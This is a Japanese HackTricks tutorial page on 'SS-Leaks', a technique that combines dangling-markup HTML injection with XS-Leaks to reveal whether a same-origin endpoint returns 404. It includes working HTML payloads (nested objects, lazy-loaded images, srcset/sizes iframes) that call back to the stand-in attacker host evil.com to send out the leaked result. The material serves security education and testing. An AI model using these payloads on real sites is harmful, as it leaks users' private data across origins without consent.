# SS-Leaks

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有する。

</details>

これは**dangling markupとXS-Leaks**の**ミックス**です。一方で、脆弱性は**同一オリジン**のページにHTML（ただしJSは不可）を**インジェクト**することを可能にします。他方で、HTMLをインジェクトできるページを直接**攻撃**するのではなく、**別のページ**を攻撃します。

## ネストされたオブジェクト

もし<mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark>エンドポイントが404ステータスコードを返す場合、内部の`object`がロードされ、<mark style="color:yellow;">`https://evil.com?callback=a`</mark>へのコールバックを提供し、検索クエリ`a`が結果を返さなかったことを知らせます。
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### レイジーローディング

CSPが外部オブジェクトをブロックした場合はどうでしょうか？次のCSPで再試行してみましょう：

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

上記の`object`コールバックはもう機能しません。代わりに、画像の[レイジーローディング](https://developer.mozilla.org/en-US/docs/Web/Performance/Lazy\_loading)を使用できます！以下の画像は、表示されていてビューポートから一定の距離内にあるときにのみロードされます。
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### レスポンシブ画像

上記の技術は優れていますが、ユーザーのビューポート内にHTMLインジェクションがあることに依存しています。

インジェクションが画面外であり、ユーザーがスクロールしない場合、データを漏洩できるでしょうか？もちろん、要素IDと[scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096)を使用してスクロールを強制するURLを作成することができますが、これらはユーザーの操作に依存しており、現実のシナリオで一貫した漏洩を達成することはできません。理想的には、格納されたHTMLインジェクションを信頼性のある方法で武器化したいです。

レスポンシブ画像の出番です！特に、画像の`srcset`と`sizes`属性です。

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

ここには解説すべきことがかなりあります。まず、リーキーなエンドポイントが404ステータスコードを返す場合にのみ、内側のiframeが表示されることを覚えておいてください。

これは重要です。なぜなら、iframe内の画像を条件付きで2つの異なるURLからロードすることになるからです。`sizes` 属性を使用して、ビューポートのサイズに応じてどのURLから画像をロードするかを選択するために、[メディアクエリ](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Using_media_queries)を使用できます。

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

iframeの`width="1000px"`があるため、以下のようなことが起こります：

1. もしリーキーなエンドポイントが404ステータスコードを返す場合、iframeは表示され、幅は1000pxになります。iframe内の画像は`(min-width: 1000px)`メディアクエリに一致し、`https://evil.com?callback=0`から800pxの画像をロードします。
2. もしリーキーなエンドポイントが200ステータスコードを返す場合、iframeは表示され_ません_。画像は大きなiframeの一部としてレンダリングされていないため、`(max-width 999px)`メディアクエリに一致し、`https://evil.com?callback=1`から480pxの画像をロードします。

## 参考文献

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
